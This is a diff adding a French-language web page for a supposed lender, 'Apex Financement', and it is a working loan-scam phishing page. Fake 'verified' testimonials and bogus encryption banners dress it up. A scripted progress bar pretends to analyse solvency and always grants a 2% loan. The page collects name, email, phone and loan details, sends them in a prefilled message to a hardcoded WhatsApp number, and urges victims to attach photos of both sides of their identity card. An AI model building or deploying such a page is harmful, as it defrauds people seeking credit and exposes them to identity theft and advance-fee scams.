@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apex Financement | Solutions de Crédit Sécurisées</title>
+    <style>
+        :root {
+            --brand-primary: #0f172a; 
+            --brand-accent: #2563eb;  
+            --brand-green: #25D366;   
+            --brand-gray: #f8fafc;    
+            --brand-footer: #0f172a;
+        }
+
+        body, html { margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; background: var(--brand-gray); overflow-x: hidden; color: #334155; }
+
+        /* --- SÉCURITÉ & HEADER --- */
+        .safety-bar { background: #0f172a; color: #94a3b8; font-size: 10px; padding: 8px 5%; text-align: right; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid #1e293b; }
+        header { background: white; border-bottom: 3px solid var(--brand-accent); padding: 20px 5%; display: flex; flex-direction: column; align-items: center; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05); }
+        .logo-container { display: flex; align-items: center; gap: 12px; }
+        .logo-icon { width: 35px; height: 35px; background: var(--brand-accent); border-radius: 6px; transform: rotate(45deg); display: flex; align-items: center; justify-content: center; }
+        .logo-icon-inner { width: 15px; height: 15px; background: white; border-radius: 2px; }
+        .logo-text { font-size: 2.2rem; font-weight: 800; color: var(--brand-primary); letter-spacing: -1px; }
+        .logo-text span { color: var(--brand-accent); }
+
+        /* --- LOADERS CIRCULAIRES --- */
+        .loader-wrap { display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .circular-container { position: relative; width: 150px; height: 150px; border-radius: 50%; background: conic-gradient(var(--brand-accent) 0%, #e2e8f0 0%); display: flex; align-items: center; justify-content: center; transition: background 0.3s; }
+        .circular-container::before { content: ""; position: absolute; width: 125px; height: 125px; background: white; border-radius: 50%; }
+        .percent-text { position: relative; font-size: 1.8rem; font-weight: 800; color: var(--brand-primary); }
+
+        /* --- GRILLE DES OFFRES --- */
+        .loan-container { padding: 50px 5%; max-width: 1200px; margin: 0 auto; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; margin-bottom: 60px; }
+        .card { background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.02); cursor: pointer; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); border: 1px solid #e2e8f0; }
+        .card:hover { transform: translateY(-8px); box-shadow: 0 20px 25px -5px rgba(37, 99, 235, 0.1); border-color: var(--brand-accent); }
+        .card-img { width: 100%; height: 200px; object-fit: cover; }
+        .card-body { padding: 25px; font-weight: 700; font-size: 1.2rem; color: var(--brand-primary); text-align: center; }
+
+        /* --- SECTION TÉMOIGNAGES --- */
+        .testimonials-section { background: white; padding: 60px 5%; border-top: 1px solid #e2e8f0; border-bottom: 1px solid #e2e8f0; }
+        .testimonials-title { text-align: center; font-size: 2rem; color: var(--brand-primary); margin-bottom: 40px; font-weight: 700; }
+        .testimonials-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; max-width: 1200px; margin: 0 auto; }
+        .testimonial-card { background: var(--brand-gray); padding: 30px; border-radius: 12px; box-shadow: inset 0 2px 4px 0 rgba(0, 0, 0, 0.02); border-left: 4px solid var(--brand-accent); }
+        .stars { color: #f59e0b; font-size: 1.1rem; margin-bottom: 10px; }
+        .testimonial-text { font-style: italic; color: #475569; line-height: 1.6; margin-bottom: 15px; font-size: 0.95rem; }
+        .client-info { display: flex; justify-content: space-between; align-items: center; font-size: 0.85rem; font-weight: 600; }
+        .client-name { color: var(--brand-primary); }
+        .client-status { color: #16a34a; }
+
+        /* --- FOOTER DÉTAILLÉ --- */
+        .footer-main { background: var(--brand-footer); color: #94a3b8; padding: 60px 5% 30px; font-size: 0.85rem; }
+        .footer-content { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 40px; border-bottom: 1px solid #334155; padding-bottom: 40px; }
+        .footer-section h4 { color: white; margin-bottom: 20px; text-transform: uppercase; font-size: 0.9rem; letter-spacing: 1px; }
+        .footer-section ul { list-style: none; padding: 0; margin: 0; }
+        .footer-section ul li { margin-bottom: 12px; cursor: pointer; transition: 0.2s; }
+        .footer-section ul li:hover { color: white; }
+        .footer-bottom { max-width: 1200px; margin: 30px auto 0; text-align: center; color: #64748b; }
+
+        /* --- MODALE & GRAND FORMULAIRE --- */
+        .modal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.8); overflow-y: auto; backdrop-filter: blur(4px); }
+        .modal-content { background: white; margin: 30px auto; padding: 40px; width: 90%; max-width: 650px; border-radius: 16px; position: relative; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); }
+        .close-btn { position: absolute; right: 25px; top: 15px; font-size: 35px; cursor: pointer; color: #94a3b8; transition: 0.2s; }
+        .close-btn:hover { color: var(--brand-primary); }
+        .step { display: none; }
+        .step.active { display: block; }
+        
+        .form-row { display: flex; gap: 15px; margin-bottom: 15px; text-align: left; }
+        .form-group { flex: 1; display: flex; flex-direction: column; }
+        label { font-size: 0.8rem; font-weight: 700; margin-bottom: 6px; color: #475569; text-transform: uppercase; letter-spacing: 0.5px; }
+        input, select { width: 100%; padding: 14px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; font-size: 1rem; color: var(--brand-primary); background: #f8fafc; }
+        input:focus, select:focus { outline: none; border-color: var(--brand-accent); background: white; }
+        
+        .file-label { background: #f1f5f9; border: 2px dashed #cbd5e1; padding: 12px; text-align: center; border-radius: 6px; cursor: pointer; font-size: 0.9rem; font-weight: 600; color: #475569; transition: 0.3s; }
+        .file-label:hover { background: #e2e8f0; border-color: var(--brand-accent); }
+        .file-input { display: none; }
+        .file-status { font-size: 0.75rem; color: var(--brand-green); font-weight: bold; margin-top: 5px; display: none; }
+
+        .btn-accent { background: var(--brand-accent); color: white; border: none; padding: 18px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 6px; margin-top: 20px; font-size: 1.1rem; text-transform: uppercase; letter-spacing: 1px; transition: 0.2s; }
+        .btn-accent:hover { background: #1d4ed8; }
+        .btn-whatsapp { background: var(--brand-green); color: white; border: none; padding: 20px; width: 100%; font-weight: bold; border-radius: 6px; display: block; text-decoration: none; font-size: 1.2rem; margin-top: 20px; text-transform: uppercase; }
+
+        @media (max-width: 600px) { .form-row { flex-direction: column; gap: 15px; } }
+    </style>
+</head>
+<body>
+
+    <div class="safety-bar">Connexion Sécurisée AES-256 • Apex Financement 2026</div>
+
+    <header>
+        <div class="logo-container">
+            <div class="logo-icon"><div class="logo-icon-inner"></div></div>
+            <div class="logo-text">APEX <span>FINANCEMENT</span></div>
+        </div>
+    </header>
+
+    <!-- Loader Transition Initiale -->
+    <div id="loader-screen" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999; flex-direction:column; align-items:center; justify-content:center;">
+        <div class="circular-container" id="circle1"><span class="percent-text" id="percent1">0%</span></div>
+        <p style="margin-top:20px; font-weight:bold; color:var(--brand-accent); letter-spacing:1px;">INITIALISATION DU CANAL SÉCURISÉ...</p>
+    </div>
+
+    <!-- Contenu Principal -->
+    <main class="loan-container">
+        <h1 style="text-align: center; margin-bottom: 40px; font-weight: 300; color: var(--brand-primary);">Quelle solution de crédit cherchez-vous ?</h1>
+        
+        <div class="grid">
+            <div class="card" onclick="startTransition('Prêt Immobilier')">
+                <img src="https://images.pexels.com/photos/106399/pexels-photo-106399.jpeg?auto=compress&w=500" class="card-img">
+                <div class="card-body">Prêt Immobilier</div>
+            </div>
+            <div class="card" onclick="startTransition('Prêt Personnel')">
+                <img src="https://images.pexels.com/photos/4386339/pexels-photo-4386339.jpeg?auto=compress&w=500" class="card-img">
+                <div class="card-body">Prêt Personnel</div>
+            </div>
+            <div class="card" onclick="startTransition('Projet Professionnel')">
+                <img src="https://images.pexels.com/photos/3183150/pexels-photo-3183150.jpeg?auto=compress&w=500" class="card-img">
+                <div class="card-body">Projet Professionnel</div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Section Témoignages Clients -->
+    <section class="testimonials-section">
+        <h2 class="testimonials-title">Ce que disent nos clients</h2>
+        <div class="testimonials-grid">
+            <div class="testimonial-card">
+                <div class="stars">★★★★★</div>
+                <p class="testimonial-text">"Le simulateur en ligne m'a permis d'obtenir une réponse claire en quelques minutes. Le suivi est un vrai plus pour la rapidité."</p>
+                <div class="client-info"><span class="client-name">Marc D.</span><span class="client-status">✓ Avis Vérifié</span></div>
+            </div>
+            <div class="testimonial-card">
+                <div class="stars">★★★★★</div>
+                <p class="testimonial-text">"Une interface simple et transparente. J'ai pu configurer mon amortissement facilement et comprendre chaque étape du financement."</p>
+                <div class="client-info"><span class="client-name">Chantal T.</span><span class="client-status">✓ Avis Vérifié</span></div>
+            </div>
+            <div class="testimonial-card">
+                <div class="stars">★★★★★</div>
+                <p class="testimonial-text">"Service client réactif et protocole de sécurité rigoureux. Ma demande de prêt professionnel a été traitée avec un grand professionnalisme."</p>
+                <div class="client-info"><span class="client-name">Thomas L.</span><span class="client-status">✓ Avis Vérifié</span></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Pied de Page (Footer) -->
+    <footer class="footer-main">
+        <div class="footer-content">
+            <div class="footer-section">
+                <h4>Nos Prêts</h4>
+                <ul><li>Prêt Immobilier</li><li>Prêt Personnel</li><li>Projet Professionnel</li></ul>
+            </div>
+            <div class="footer-section">
+                <h4>Support</h4>
+                <ul><li>Centre d'aide</li><li>Contact Sécurisé</li><li>Questions Fréquentes</li></ul>
+            </div>
+            <div class="footer-section">
+                <h4>Informations</h4>
+                <ul><li>Mentions légales</li><li>Protection des données</li><li>Politique de cookies</li></ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>Apex Financement Continental Europe © Copyright 2026. Tous droits réservés.</p>
+        </div>
+    </footer>
+
+    <!-- Fenêtre Modale (Formulaire & Validation) -->
+    <div id="loanModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="location.reload()">&times;</span>
+            
+            <!-- Étape 1 : Le Grand Formulaire -->
+            <div id="step1" class="step active">
+                <h2 style="color:var(--brand-accent); margin-bottom:25px;">Demande de Financement : <span id="modalTitle"></span></h2>
+                
+                <div class="form-row">
+                    <div class="form-group"><label>Nom</label><input type="text" id="nom" placeholder="Ex: DUPONT"></div>
+                    <div class="form-group"><label>Prénom</label><input type="text" id="prenom" placeholder="Ex: Jean"></div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group"><label>Adresse E-mail</label><input type="email" id="email" placeholder="votre@email.com"></div>
+                    <div class="form-group"><label>Numéro WhatsApp</label><input type="text" id="tel" placeholder="Ex: +33 6 00 00 00 00"></div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group"><label>Montant souhaité (€)</label><input type="number" id="amt" placeholder="Ex: 50000"></div>
+                    <div class="form-group">
+                        <label>Durée du crédit</label>
+                        <select id="duree">
+                            <option value="12 mois">12 mois (1 an)</option>
+                            <option value="24 mois">24 mois (2 ans)</option>
+                            <option value="48 mois">48 mois (4 ans)</option>
+                            <option value="72 mois">72 mois (6 ans)</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Type d'amortissement</label>
+                        <select id="amortissement">
+                            <option value="Amortissement Constant (Mensuel)">Amortissement Constant (Mensualités égales)</option>
+                            <option value="Amortissement In Fine">Amortissement In Fine (Capital à la fin)</option>
+                        </select>
+                    </div>
+                </div>
+
+                <p style="text-align:left; font-size:0.85rem; font-weight:bold; color:var(--brand-accent); margin: 20px 0 10px; border-top: 1px dashed #cbd5e1; padding-top:15px; text-transform:uppercase;">🔒 Pièce d'identité requise (Contrôle KYC)</p>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Pièce d'identité (RECTO)</label>
+                        <label for="id-recto" class="file-label" id="lbl-recto">📸 Charger le Recto</label>
+                        <input type="file" id="id-recto" class="file-input" accept="image/*" onchange="fileUploaded('recto')">
+                        <span id="status-recto" class="file-status">✓ Fichier prêt</span>
+                    </div>
+                    <div class="form-group">
+                        <label>Pièce d'identité (VERSO)</label>
+                        <label for="id-verso" class="file-label" id="lbl-verso">📸 Charger le Verso</label>
+                        <input type="file" id="id-verso" class="file-input" accept="image/*" onchange="fileUploaded('verso')">
+                        <span id="status-verso" class="file-status">✓ Fichier prêt</span>
+                    </div>
+                </div>
+
+                <button class="btn-accent" onclick="runFinalAnalysis()">Lancer l'analyse de solvabilité (38s)</button>
+            </div>
+
+            <!-- Étape 2 : Loader Lent -->
+            <div id="step2" class="step">
+                <h2 id="ana-title">Analyse du profil en cours...</h2>
+                <div class="loader-wrap" style="margin: 35px 0;">
+                    <div class="circular-container" id="circle2"><span class="percent-text" id="percent2">0%</span></div>
+                </div>
+                <p id="status-msg" style="font-style:italic; color:#64748b; font-size:0.95rem;">Interrogation des registres bancaires...</p>
+            </div>
+
+            <!-- Étape 3 : Écran de Succès -->
+            <div id="step3" class="step">
+                <div style="font-size: 60px; margin-bottom: 10px;">✅</div>
+                <h2 style="color:var(--brand-green)">ACCORD DE PRINCIPE CONFIRMÉ</h2>
+                <p>Votre profil respecte nos critères de financement au taux de 2%.</p>
+                <p style="font-weight: bold; color: #e11d48; background: #fff1f2; padding: 12px; border-radius: 8px; font-size: 0.9rem;">⚠️ IMPORTANT : Cliquez sur le bouton vert ci-dessous, puis pensez à joindre immédiatement les photos de votre pièce d'identité via l'icône trombone (📎) sur WhatsApp.</p>
+                <a href="#" id="wa" class="btn-whatsapp">Finaliser et envoyer mon dossier</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const monNum = "351920640932";
+        let typeSelected = "";
+
+        function fileUploaded(side) {
+            document.getElementById('status-' + side).style.display = 'block';
+            document.getElementById('lbl-' + side).style.background = '#f0fdf4';
+            document.getElementById('lbl-' + side).style.borderColor = '#25D366';
+            document.getElementById('lbl-' + side).innerText = '🔄 Modifier';
+        }
+
+        function startTransition(t) {
+            typeSelected = t;
+            const screen = document.getElementById('loader-screen');
+            screen.style.display = 'flex';
+            let p = 0;
+            let itv = setInterval(() => {
+                p++;
+                document.getElementById('percent1').innerText = p + "%";
+                document.getElementById('circle1').style.background = `conic-gradient(var(--brand-accent) ${p}%, #e2e8f0 ${p}%)`;
+                if(p >= 100) {
+                    clearInterval(itv);
+                    setTimeout(() => { 
+                        screen.style.display = 'none'; 
+                        document.getElementById('modalTitle').innerText = typeSelected; 
+                        document.getElementById('loanModal').style.display = 'block'; 
+                    }, 300);
+                }
+            }, 15);
+        }
+
+        function runFinalAnalysis() {
+            if(!document.getElementById('nom').value || !document.getElementById('tel').value || !document.getElementById('amt').value || !document.getElementById('id-recto').value || !document.getElementById('id-verso').value) {
+                return alert("Veuillez remplir le formulaire et charger les fichiers de votre pièce d'identité.");
+            }
+            
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+
+            let p = 0;
+            const circle = document.getElementById('circle2');
+            const percentText = document.getElementById('percent2');
+            const status = document.getElementById('status-msg');
+            const title = document.getElementById('ana-title');
+
+            let itv = setInterval(() => {
+                p++;
+                percentText.innerText = p + "%";
+                circle.style.background = `conic-gradient(var(--brand-accent) ${p}%, #e2e8f0 ${p}%)`;
+
+                if(p == 25) status.innerText = "Analyse de la capacité d'endettement...";
+                if(p == 55) status.innerText = "Chiffrement sécurisé des pièces d'identité (AES-256)...";
+                if(p == 85) status.innerText = "Préparation des conditions de l'offre à 2%...";
+
+                if(p >= 100) {
+                    clearInterval(itv);
+                    circle.style.background = `var(--brand-green)`; 
+                    percentText.style.color = "white";
+                    percentText.innerText = "100%";
+                    title.innerText = "Analyse Validée !";
+                    title.style.color = "var(--brand-green)";
+                    status.innerText = "Vérifications de sécurité complétées.";
+
+                    setTimeout(() => {
+                        const nom = document.getElementById('nom').value;
+                        const prenom = document.getElementById('prenom').value;
+                        const email = document.getElementById('email').value;
+                        const telClient = document.getElementById('tel').value;
+                        const amt = document.getElementById('amt').value;
+                        const dur = document.getElementById('duree').value;
+                        const amo = document.getElementById('amortissement').value;
+                        
+                        const m = `🏦 *DOSSIER APEX FINANCEMENT*\n\n` +
+                                  `👤 *Client :* ${nom.toUpperCase()} ${prenom}\n` +
+                                  `📧 *Email :* ${email}\n` +
+                                  `📱 *WhatsApp :* ${telClient}\n` +
+                                  `📂 *Projet :* ${typeSelected}\n` +
+                                  `💰 *Montant :* ${amt} €\n` +
+                                  `⏳ *Durée :* ${dur}\n` +
+                                  `📈 *Amortissement :* ${amo}\n\n` +
+                                  `📎 *PIÈCES REQUISES :*\n` +
+                                  `👉 _Je m'apprête à envoyer les photos de ma carte d'identité (RECTO/VERSO) via l'icône trombone._`;
+                        
+                        document.getElementById('wa').href = `https://wa.me/${monNum}?text=${encodeURIComponent(m)}`;
+                        
+                        document.getElementById('step2').classList.remove('active');
+                        document.getElementById('step3').classList.add('active');
+                    }, 1800);
+                }
+            }, 370); 
+        }
+    </script>
+</body>
+</html>
